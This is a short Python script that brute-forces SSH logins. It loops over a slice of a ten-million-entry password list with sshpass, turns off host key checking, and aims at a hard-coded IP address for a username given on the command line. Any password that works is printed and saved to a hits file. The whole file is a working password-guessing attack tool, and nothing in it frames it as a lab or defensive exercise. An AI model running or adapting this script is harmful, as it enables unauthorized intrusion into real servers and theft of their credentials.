import subprocess,sys,time
user=sys.argv[1]; start=int(sys.argv[2]); count=int(sys.argv[3])
pw=[l.rstrip('\n') for l in open('pw10m.txt')][start:start+count]
base=['sshpass','-p','','ssh','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=6','-o','PreferredAuthentications=password','-o','PubkeyAuthentication=no','-o','NumberOfPasswordPrompts=1',user+'@141.8.192.100','id']
for p in pw:
    cmd=base[:]; cmd[2]=p
    try:
        r=subprocess.run(cmd,stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,timeout=12)
        if r.returncode==0 and b'uid=' in r.stdout:
            print(f'SSHHIT {user}:{p}',flush=True); open('HIT_SSH.txt','w').write(user+':'+p+'\n'); sys.exit(0)
    except Exception: pass
print('SSHDONE',start,flush=True)
